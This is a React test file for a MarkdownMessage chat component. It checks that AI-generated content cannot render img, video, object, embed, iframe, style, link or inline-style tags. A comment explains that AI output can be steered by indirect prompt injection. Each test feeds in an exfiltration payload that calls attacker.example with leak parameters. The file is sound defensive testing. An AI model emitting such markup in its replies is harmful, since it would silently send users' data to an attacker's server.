import React from 'react'
import { render, screen, waitFor } from 'uiSrc/utils/test-utils'

import MarkdownMessage from './MarkdownMessage'

describe('MarkdownMessage', () => {
  it('should render', () => {
    expect(render(<MarkdownMessage>1</MarkdownMessage>)).toBeTruthy()
  })

  it('should render plain markdown content', async () => {
    render(<MarkdownMessage>Hello **world**</MarkdownMessage>)

    await waitFor(() => {
      expect(screen.getByText(/world/i)).toBeInTheDocument()
    })
  })

  describe('security', () => {
    // RED-194228 / VDP-4596: message content can be influenced by untrusted
    // data (indirect prompt injection), so tags able to trigger an outbound
    // request must never render — otherwise they exfiltrate data on load.
    it('should not render <img> tags from AI content', async () => {
      const { container } = render(
        <MarkdownMessage>
          {'A bike. <img src="https://attacker.example/?leak=secret">'}
        </MarkdownMessage>,
      )

      await waitFor(() => {
        expect(screen.getByText(/A bike\./)).toBeInTheDocument()
      })

      expect(container.querySelector('img')).toBeNull()
    })

    it('should not render other passive network tags from AI content', async () => {
      const { container } = render(
        <MarkdownMessage>
          {'Marker text. ' +
            '<video src="https://attacker.example/v"></video>' +
            '<object data="https://attacker.example/o"></object>' +
            '<embed src="https://attacker.example/e">' +
            '<iframe src="https://attacker.example/i"></iframe>'}
        </MarkdownMessage>,
      )

      // MarkdownMessage formats asynchronously, so wait for content to render
      // before asserting absence — otherwise the checks pass trivially.
      await waitFor(() => {
        expect(screen.getByText(/Marker text\./)).toBeInTheDocument()
      })

      expect(container.querySelector('video')).toBeNull()
      expect(container.querySelector('object')).toBeNull()
      expect(container.querySelector('embed')).toBeNull()
      expect(container.querySelector('iframe')).toBeNull()
    })

    it('should not render an inline style that could beacon out via CSS', async () => {
      const { container } = render(
        <MarkdownMessage>
          {'Marker text. ' +
            '<span style="background-image:url(https://attacker.example/?leak=1)">text</span>'}
        </MarkdownMessage>,
      )

      await waitFor(() => {
        expect(screen.getByText(/Marker text\./)).toBeInTheDocument()
      })

      // No rendered element may carry a `style` attribute (stripped, or the
      // whole message falls back to escaped text) — either way nothing loads.
      expect(container.querySelector('[style]')).toBeNull()
    })

    it('should not render a <style> element that could beacon out via CSS', async () => {
      const { container } = render(
        <MarkdownMessage>
          {'Marker text. ' +
            '<style>@import url(https://attacker.example/?leak=1);</style>'}
        </MarkdownMessage>,
      )

      await waitFor(() => {
        expect(screen.getByText(/Marker text\./)).toBeInTheDocument()
      })

      expect(container.querySelector('style')).toBeNull()
    })

    it('should not render a raw <link> element that could load external resources', async () => {
      const { container } = render(
        <MarkdownMessage>
          {'Marker text. ' +
            '<link rel="stylesheet" href="https://attacker.example/leak.css">'}
        </MarkdownMessage>,
      )

      await waitFor(() => {
        expect(screen.getByText(/Marker text\./)).toBeInTheDocument()
      })

      expect(container.querySelector('link')).toBeNull()
    })
  })
})
